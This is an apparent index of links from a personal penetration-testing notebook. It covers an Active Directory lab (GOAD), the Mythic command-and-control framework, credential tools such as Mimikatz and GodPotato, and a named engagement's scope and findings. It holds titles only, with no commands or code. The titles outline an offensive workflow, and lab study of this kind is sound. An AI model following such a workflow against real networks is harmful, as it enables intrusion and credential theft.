- [[GOAD - Enumeration - Initial Recon]]
- [[GOAD - Enumeration - Poisoning and Relay]]
- [[GOAD - Active Directory - Inside the Domain Workflow]]
- [[GOAD - Active Directory - BloodHound Collection]]
- [[GOAD - Active Directory - ADCS]]
- [[GOAD - Active Directory - Delegation]]
- [[GOAD - Active Directory - ACL and ACE Abuse]]
- [[GOAD - Active Directory - Trusts]]
- [[GOAD - Services - MSSQL]]
- [[GOAD - Exploitation - Privilege Escalation]]
- [[Mythic - Architecture Overview]]
- [[Mythic - Installation and Verification]]
- [[Mythic - Payload Generation]]
- [[Mythic - Lab Operations - GodPotato and Mimikatz]]
- [[Operation Cypher-Knife - Scope]]
- [[Operation Cypher-Knife - Findings]]
- TODO — [[Operation Cypher-Knife - Lessons Learned]]
